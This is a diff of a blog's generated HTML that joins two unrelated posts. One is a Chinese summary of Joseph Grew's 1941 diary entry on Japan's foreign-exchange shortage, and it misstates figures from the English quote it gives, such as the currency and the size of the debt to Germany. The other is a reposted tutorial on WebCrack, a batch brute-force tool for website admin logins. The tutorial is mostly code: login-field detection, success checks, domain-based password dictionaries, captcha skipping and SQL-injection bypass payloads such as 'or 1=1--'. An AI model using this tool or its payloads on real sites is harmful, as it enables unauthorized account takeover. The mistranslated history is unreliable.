+<p>在中文网络上，搜索关于1941年日本外汇储备的情况也几乎都能追溯到这个引用。不过这个引用细究一下有点奇怪。作者约瑟夫·C·格鲁是美国驻日大使，日本政府的财政状况，他何以清楚呢？毕竟当年不是现在，日本政府、军部应该不会定期公开发布全面的财政报告。</p>
+</blockquote>
+<p><a href="https://book.douban.com/subject/1479333/" target="_blank" rel="noopener">《使日十年》(<i>Ten Years in Japan</i>)</a>，是 1932 年至 1942 年间担任美国驻日大使<a href="https://zh.wikipedia.org/wiki/%E7%BA%A6%E7%91%9F%E5%A4%AB%C2%B7%E6%A0%BC%E9%B2%81" target="_blank" rel="noopener">约瑟夫-C-格鲁(Joseph Clark Grew)</a>的日记及公私文件摘录。该书的英文原版可以在<a href="https://archive.org/details/TenYearsInJapan/page/n327" target="_blank" rel="noopener">这个链接</a>查看。在该链接中，<a href="https://archive.org/details/TenYearsInJapan/page/n399" target="_blank" rel="noopener">第399页</a>，章节 Frozen credits bring japan close to bankruptcy写道:</p>
+<blockquote>
+<p>October 9, 1941</p>
+<p>According to information received by a member of my staff from what is regarded as a very reliable source, <strong>the amount of foreign exchange available to the Japanese Government now is approximately 20,000 reichsmarks</strong>, and under the circumstances the Japanese Government will be unable to avoid defaulting on contracts calling for foreign exchange on maturity. The freezing regulations which were put into effect by the United States, Great Britain, and the Netherlands East Indies have completely cut off any exchange transactions in the currencies of those countries, and in addition have greatly reduced transactions in the currencies of South American countries. According to this information, his own contracts involve foreign exchange totalling approximately five million Swedish kronen, and during recent months Japanese purchases of Swedish goods have been primarily financed through Berlin, persumably through German advanced credits.</p>
+<p>The Japanese have been informed recently by the Germans that these credits are now frozen and are to used only to purchase of German goods. According to our informant it is possible that this action by the Germans was taken in anticipation of Japan's withdrawal from the Axis. According to another soure it is believed that since Sweden is heavily indebted to Germany for armaments, the Germans are now demanding in return from Sweden goods instead of Swedish kronen. Reports are current here that Japan is now eighty million marks in debt to Germany.</p>
+<p>In actual fact Japan is now in virtually the same embarrassing position from the point of view of international finance as are designated foreigners in this country.</p>
+</blockquote>
+<p>这里，作者直接提到了，根据十分可靠的信息来源，日本政府的外汇储备大约是两万德国马克，日本将无力支付外汇合同。由美国，英国和荷兰东印度公司联合制定的冻结条款阻止了日本获得这些国家的货币储备，同时也削弱了日本和南美国家的交易。近几个月以来，日本和瑞士方面的价值五百万瑞士克朗的订单主要在依靠德国的贷款进行支付。不过近期德国告知日本方面日本的贷款也被冻结，而且贷款只能用于从德国购买商品。目前日本已经欠了德国大约八百万马克。这意味着日本的财政即将崩溃。</p>
+<p>一些其他有意思的发现（下面的页码都是前面给出的英文原版链接中的页码）：</p>
+<ol type="1">
+<li>第 326 页: 1941 年，大使已经听到了很多谈论日本将会对珍珠港发动大规模的突然袭击的说法，并且报告了政府。原文是: <i>There is a lot of talk around town to the effect that the Japanese, in case of a break with the United States, are planning to go all out in a surprise attack on Pearl Harbour. Of course I informed our Government.</i></li>
+</ol>
 
           
         
@@ -2643,88 +2507,48 @@ $$
       
         
           
-            
-这是一篇转载的文章。文章来源是：[https://zhuanlan.zhihu.com/p/89205738](https://zhuanlan.zhihu.com/p/89205738)
+            <p>这是一篇转载的文章。文章来源是：<a href="https://zhuanlan.zhihu.com/p/89205738" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89205738</a></p>
+<h1 data-number="1" id="webcrack-简介"><span class="header-section-number">1</span> WebCrack 简介</h1>
+<p>WebCrack 是一款开源免费的web后台弱口令/万能密码批量爆破、检测工具。</p>
+<p>不仅支持如discuz，织梦，phpmyadmin等主流CMS的后台爆破，并且对于绝大多数小众CMS甚至个人开发网站后台都有效果，只需在工具中导入后台地址即可进行自动化检测。</p>
+<h1 data-number="2" id="使用方法"><span class="header-section-number">2</span> 使用方法</h1>
+<h2 data-number="2.1" id="下载"><span class="header-section-number">2.1</span> 下载</h2>
+<p>GitHub 项目: <a href="https://github.com/yzddmr6/WebCrack" target="_blank" rel="noopener">https://github.com/yzddmr6/WebCrack</a>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/yzddmr6/WebCrack</span><br></pre></td></tr></table></figure>
+<h2 data-number="2.2" id="安装所需依赖"><span class="header-section-number">2.2</span> 安装所需依赖</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>
+<h2 data-number="2.3" id="运行脚本"><span class="header-section-number">2.3</span> 运行脚本</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python webcrack.py </span></span><br><span class="line">*****************************************************</span><br><span class="line">*　　　　　　　　　　　　　　　　　　　　　　 　    * </span><br><span class="line">****************    Code By yzddMr6   ***************</span><br><span class="line">*　　　　　　　　　　　　　　　　　　　　　　 　    *</span><br><span class="line">*****************************************************</span><br><span class="line">File or Url:</span><br></pre></td></tr></table></figure>
+<p>输入文件名则进行批量爆破，输入 URL 则进行单域名爆破。</p>
+<h2 data-number="2.4" id="自定义配置"><span class="header-section-number">2.4</span> 自定义配置</h2>
+<p>在 <code>cms.json</code>里面可以进行自定义配置</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"这是cms的名称"</span>,</span><br><span class="line">    <span class="attr">"keywords"</span>: <span class="string">"这里是cms后台页面的关键字，是识别cms的关键"</span>,</span><br><span class="line">    <span class="attr">"captcha"</span>: <span class="string">"1 为后台有验证，0 为没有。因为此版本并没有处理验证码，所以为 1 则退出爆破"</span>,</span><br><span class="line">    <span class="attr">"exp_able"</span>: <span class="string">"是否启用万能密码模块爆破"</span>,</span><br><span class="line">    <span class="attr">"success_flag"</span>: <span class="string">"登录成功过后的关键字"</span>,</span><br><span class="line">    <span class="attr">"fail_flag"</span>: <span class="string">"请谨慎填写此项。如果填写此项，遇到里面的关键字就会退出爆破，用于 dz 等对于爆破有次数限制的cms"</span>,</span><br><span class="line">    <span class="attr">"alert"</span>: <span class="string">"若为 1 则会打印下面的 note 内容"</span>,</span><br><span class="line">    <span class="attr">"note"</span>: <span class="string">"请保证本文件是 UTF 格式，并且请勿删除此说明"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>文件里面给出了集中常见的 cms 的配置方案，可进行参考。</p>
+<h1 data-number="3" id="原理分析"><span class="header-section-number">3</span> 原理分析</h1>
+<p>根据我们平时使用burpsuite中的爆破的原理，可知webcrack的爆破原理与其差异不大，自动分析找到爆破点、带入字典进行匹配、判断是否成功。</p>
+<h2 data-number="3.1" id="寻找爆破点"><span class="header-section-number">3.1</span> 寻找爆破点</h2>
+<p>根据提取到的参数名来匹配用户名和密码的位置（缺陷：可能不包含在已设定的选项中）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> content.find_all(<span class="string">'input'</span>):</span><br><span class="line">    ok_flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> x.has_attr(<span class="string">'name'</span>):</span><br><span class="line">        parameter = x[<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">elif</span> x.has_attr(<span class="string">'id'</span>):</span><br><span class="line">        parameter = x[<span class="string">'id'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parameter = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> x.has_attr(<span class="string">'value'</span>):</span><br><span class="line">        value = x[<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = <span class="string">'0000'</span></span><br><span class="line">    <span class="keyword">if</span> paramter:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user_key:</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> [<span class="string">'user'</span>, <span class="string">'name'</span>, <span class="string">'zhanghao'</span>, <span class="string">'yonghu'</span>, <span class="string">'email'</span>,.<span class="string">'account'</span>]:</span><br><span class="line">                <span class="keyword">if</span> z <span class="keyword">in</span> paramter.lower():</span><br><span class="line">                    value = <span class="string">'&#123;username&#125;'</span></span><br><span class="line">                    user_key = parameter</span><br><span class="line">                    ok_flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ok_flag:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> [<span class="string">'pass'</span>, <span class="string">'pw'</span>, <span class="string">'mima'</span>]:</span><br><span class="line">                <span class="keyword">if</span> y <span class="keyword">in</span> parameter.lower():</span><br><span class="line">                    value = <span class="string">'&#123;pass_word&#125;'</span></span><br><span class="line">                    pass_key = parameter</span><br><span class="line">                    ok_flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        data[parameter] = str(value)</span><br></pre></td></tr></table></figure>
+<h2 data-number="3.2" id="判断是否成功"><span class="header-section-number">3.2</span> 判断是否成功</h2>
+<p>原理就是先对两个错误请求的返回值进行比较，如果不同，则无法进行判断，退出爆破；如果相同，则记录下来作为判断的标准。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error_length</span><span class="params">(conn, path, data)</span>:</span></span><br><span class="line">    data1 = data</span><br><span class="line">    cookie_error_flag = <span class="number">0</span></span><br><span class="line">    dynamic_reg_len = <span class="number">0</span></span><br><span class="line">    data2 = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, <span class="string">'admin'</span>))</span><br><span class="line">    data2 = str(data2.replace(<span class="string">'%7Bpass_word%7D'</span>, <span class="string">'length_test'</span>))</span><br><span class="line">    res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">        allow_redirects=<span class="keyword">True</span>, proxies=requests_proxies()) <span class="comment"># 先请求一次</span></span><br><span class="line">    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">        allow_redirects=<span class="keyword">True</span>, proxies=requests_proxies())</span><br><span class="line">    res_02.encoding = res_02.apparent_encoding</span><br><span class="line">    res = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>, allow_redirects=<span class="keyword">True</span>,</span><br><span class="line">        proxies=requests_proxies())</span><br><span class="line">    res.encoding = res.apparent_encoding</span><br><span class="line">    error_length_02 = len(res_02.text + str(res_02.headers))</span><br><span class="line">    error_length = len(res.text + str(res.headers))</span><br><span class="line">    <span class="keyword">if</span> error_length_02 != error_length:</span><br><span class="line">        cookies_error_flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> error_length, cookie_error_flag, dynamic_req_len</span><br></pre></td></tr></table></figure>
+<p>根据黑名单判断，出现黑名单中的情况判定为爆破失败</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fail_words = [<span class="string">'密码错误'</span>, <span class="string">'重试'</span>, <span class="string">'不正确'</span>, <span class="string">'密码有误'</span>,<span class="string">'不成功'</span>, <span class="string">'重新输入'</span>, <span class="string">'history.back'</span>, <span class="string">'不存在'</span>, <span class="string">'登录失败'</span>, <span class="string">'登陆失败'</span>,<span class="string">'出错'</span>, <span class="string">'已被锁定'</span>,<span class="string">'history.go'</span>,<span class="string">'安全拦截'</span>,<span class="string">'还可以尝试'</span>,<span class="string">'无效'</span>,<span class="string">'攻击行为'</span>,<span class="string">'创宇盾'</span>, <span class="string">'非法'</span>,<span class="string">'百度云加速'</span>,<span class="string">'安全威胁'</span>,<span class="string">'防火墙'</span>,<span class="string">'黑客'</span>, <span class="string">'不合法'</span>,<span class="string">'warning.asp?msg='</span>,<span class="string">'Denied'</span>]</span><br></pre></td></tr></table></figure>
+<p>为了提高准确度，防止误报，还有重新检查的环节。就是再次把爆破出的帐号密码发送一次，将返回值与一个新的错误返回值进行对比，如果不同，则表示爆破成功。（为什么不使用前面记录下来的错误返回值进行对比，因为WAF的存在或其他因素的干扰会导致返回值的变化）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recheck</span><span class="params">(path, data, user_name, pass_word)</span>:</span></span><br><span class="line">    data1 = data</span><br><span class="line">    conn = requests.session()</span><br><span class="line">    pass_word = str(pass_word.replace(<span class="string">'&#123;user&#125;'</span>, user_name))</span><br><span class="line"></span><br><span class="line">    data_test = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, user_name))</span><br><span class="line">    data_test = str(data_test.replace(<span class="string">'%7Bpass_word%7D'</span>, <span class="string">'length_test'</span>))</span><br><span class="line"></span><br><span class="line">    data2 = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, user_name))</span><br><span class="line">    data2 = str(data2.replace(<span class="string">'%7Bpass_word%7D'</span>, pass_word))</span><br><span class="line"></span><br><span class="line">    res_01 = conn.post(url=path, data=data_test, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">                       allow_redirects=<span class="keyword">False</span>, proxies=requests_proxies())</span><br><span class="line">    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">                       allow_redirects=<span class="keyword">False</span>, proxies=requests_proxies())</span><br><span class="line">    res_01.encoding = res_01.apparent_encoding</span><br><span class="line">    res_02.encoding = res_02.apparent_encoding</span><br><span class="line">    error_length_01 = len(res_01.text+str(res_01.headers))</span><br><span class="line">    error_length_02 = len(res_02.text+str(res_02.headers))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> error_length_01 == error_length_02:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2 data-number="3.3" id="动态词典"><span class="header-section-number">3.3</span> 动态词典</h2>
+<p>根据域名自动生成动态词典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_dynam_dic</span><span class="params">(url)</span>:</span></span><br><span class="line">    dynam_pass_dic = []</span><br><span class="line">    tmp_dic = []</span><br><span class="line">    suffix_dic = [<span class="string">''</span>, <span class="string">'123'</span>, <span class="string">'888'</span>, <span class="string">'666'</span>, <span class="string">'123456'</span>]</span><br><span class="line">    list1 = url.split(<span class="string">'/'</span>)</span><br><span class="line">    host = list1[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    compile_ip = re.compile(<span class="string">'^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> compile_ip.match(host):</span><br><span class="line">        check_ip = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        check_ip = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_ip:</span><br><span class="line">        list2 = host.split(<span class="string">"."</span>)</span><br><span class="line">        i = len(list2)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> range(i):  <span class="comment"># 生成url字典1</span></span><br><span class="line">            list3 = list2[u:]</span><br><span class="line">            part = <span class="string">'.'</span>.join(list3)</span><br><span class="line">            <span class="keyword">if</span> (len(part) &lt; <span class="number">5</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dynam_pass_dic.append(part)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> range(i):  <span class="comment"># 生成url字典2</span></span><br><span class="line">            list3 = list2[u]</span><br><span class="line">            <span class="keyword">if</span> len(list3) &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp_dic.append(list3)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp_dic:</span><br><span class="line">            <span class="keyword">for</span> suffix <span class="keyword">in</span> suffix_dic:</span><br><span class="line">                u = i + suffix</span><br><span class="line">                dynam_pass_dic.append(u)</span><br><span class="line">        <span class="keyword">return</span> dynam_pass_dic</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
+<p>如果输入的是一个 IP，则返回一个空的列表。</p>
+<h2 data-number="3.4" id="万能密码"><span class="header-section-number">3.4</span> 万能密码</h2>
+<p>除了弱口令以外，还可能存在万能密码的漏洞，WebCrack中添加了一些常用的payload用来检测是否存在万能密码的漏洞。（缺陷：可能会被WAF拦截）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exp_user_dic = [<span class="string">"admin' or 'a'='a"</span>, <span class="string">"'or'='or'"</span>, <span class="string">"admin' or '1'='1' or 1=1"</span>, <span class="string">"')or('a'='a"</span>, <span class="string">"'or 1=1--"</span>]</span><br><span class="line">exp_pass_dic = exp_user_dic</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exp_able:</span><br><span class="line">    user_dic=exp_user_dic</span><br><span class="line">    pass_dic=exp_pass_dic</span><br><span class="line">    print(<span class="string">'Exp_dic is trying'</span>)</span><br><span class="line">    user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)</span><br><span class="line">    <span class="keyword">if</span> user_name:</span><br><span class="line">        print(<span class="string">"Rechecking......"</span>,url, user_name, pass_word)</span><br><span class="line">        recheck_flag = recheck(path, data, user_name, pass_word)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        recheck_flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    recheck_flag = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h2 data-number="3.5" id="验证码"><span class="header-section-number">3.5</span> 验证码</h2>
+<p>这部分自动化完成比较困难，这里只提供了一个简单的解决方案</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">captchas = [<span class="string">'验证码'</span>, <span class="string">'验 证 码'</span>,<span class="string">'点击更换'</span>, <span class="string">'点击刷新'</span>,<span class="string">'看不清'</span>,<span class="string">'认证码'</span>,<span class="string">'安全问题'</span>]</span><br><span class="line"><span class="keyword">if</span> cms_id  <span class="keyword">and</span>  cms[cms_id][<span class="string">'captcha'</span>] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"[-] captcha in login page: "</span> + url + <span class="string">'\n'</span>,time.strftime(<span class="string">'%Y-%m-%d %X'</span>, time.localtime(time.time())))</span><br><span class="line">    <span class="keyword">with</span> open(log_file, <span class="string">'a+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">        log.write(<span class="string">"[-] captcha in login page: "</span>  + url + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cms_id :</span><br><span class="line">        <span class="keyword">for</span> captcha <span class="keyword">in</span> captchas:</span><br><span class="line">            <span class="keyword">if</span> captcha <span class="keyword">in</span> html:</span><br><span class="line">                print(<span class="string">"[-]"</span> + captcha + <span class="string">" in login page: "</span> + url + <span class="string">'\n'</span>,time.strftime(<span class="string">'%Y-%m-%d %X'</span>, time.localtime(time.time())))</span><br><span class="line">                <span class="keyword">with</span> open(log_file, <span class="string">'a+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">                    log.write(<span class="string">"[-]"</span> + captcha + <span class="string">" in login page: "</span> + url + <span class="string">'\n'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>因为通用型爆破，可能无法做到百分百准确，可以修改配置文件来更符合你的需求。（出现sql错误信息可能存在post注入的情况无法进行爆破）二向箔安全 最近开放了一系列免费的网络安全技能包，通过学习技能不断提升自我能力，在网络安全的世界中不断闯关升级。</p>
 
-## WebCrack 简介
-
-WebCrack 是一款开源免费的web后台弱口令/万能密码批量爆破、检测工具。
-
-不仅支持如discuz，织梦，phpmyadmin等主流CMS的后台爆破，并且对于绝大多数小众CMS甚至个人开发网站后台都有效果，只需在工具中导入后台地址即可进行自动化检测。
-
-## 使用方法
-
-### 下载
-
-GitHub 项目: [https://github.com/yzddmr6/WebCrack](https://github.com/yzddmr6/WebCrack)。
-
-<!--￼0-->
-
-### 安装所需依赖
-
-<!--￼1-->
-
-### 运行脚本
-
-<!--￼2-->
-
-输入文件名则进行批量爆破，输入 URL 则进行单域名爆破。
-
-### 自定义配置
-
-在 `cms.json`里面可以进行自定义配置
-
-<!--￼3-->
-
-文件里面给出了集中常见的 cms 的配置方案，可进行参考。
-
-## 原理分析
-
-根据我们平时使用burpsuite中的爆破的原理，可知webcrack的爆破原理与其差异不大，自动分析找到爆破点、带入字典进行匹配、判断是否成功。
-
-### 寻找爆破点
-
-根据提取到的参数名来匹配用户名和密码的位置（缺陷：可能不包含在已设定的选项中）
-
-<!--￼4-->
-
-### 判断是否成功
-
-原理就是先对两个错误请求的返回值进行比较，如果不同，则无法进行判断，退出爆破；如果相同，则记录下来作为判断的标准。
-
-<!--￼5-->
-
-根据黑名单判断，出现黑名单中的情况判定为爆破失败
-
-<!--￼6-->
-
-为了提高准确度，防止误报，还有重新检查的环节。就是再次把爆破出的帐号密码发送一次，将返回值与一个新的错误返回值进行对比，如果不同，则表示爆破成功。（为什么不使用前面记录下来的错误返回值进行对比，因为WAF的存在或其他因素的干扰会导致返回值的变化）
-
-<!--￼7-->
-
-### 动态词典
-
-根据域名自动生成动态词典
-
-<!--￼8-->
-
-如果输入的是一个 IP，则返回一个空的列表。
-
-### 万能密码
-
-除了弱口令以外，还可能存在万能密码的漏洞，WebCrack中添加了一些常用的payload用来检测是否存在万能密码的漏洞。（缺陷：可能会被WAF拦截）
-
-<!--￼9-->
-
-### 验证码
-
-这部分自动化完成比较困难，这里只提供了一个简单的解决方案
-
-<!--￼10-->
-
----
-
-因为通用型爆破，可能无法做到百分百准确，可以修改配置文件来更符合你的需求。（出现sql错误信息可能存在post注入的情况无法进行爆破）二向箔安全 最近开放了一系列免费的网络安全技能包，通过学习技能不断提升自我能力，在网络安全的世界中不断闯关升级。
           
         
       
